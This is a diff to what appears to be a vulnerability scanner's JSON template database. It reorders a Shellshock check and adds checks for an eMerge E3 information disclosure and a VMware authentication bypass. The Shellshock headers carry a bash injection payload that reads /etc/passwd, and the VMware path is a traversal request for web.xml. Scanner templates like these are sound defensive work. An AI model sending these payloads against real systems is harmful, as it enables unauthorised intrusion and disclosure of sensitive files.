@@ -3354,9 +3354,9 @@
       "requests": [
         {
           "headers": {
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -19871,6 +19871,21 @@
       ]
     },
     {
+      "id": "CVE-2022-31269",
+      "info": {
+        "name": "eMerge E3-Series - Information Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/test.txt"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-31373",
       "info": {
         "name": "SolarView Compact 6.00 - Cross-Site Scripting(XSS)",
@@ -20189,6 +20204,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/git/notifyCommit?url={{randstr}}&branches={{randstr}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-31656",
+      "info": {
+        "name": "VMware - Authentication Bypass",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/SAAS/t/_/;/WEB-INF/web.xml"
           ]
         }
       ]
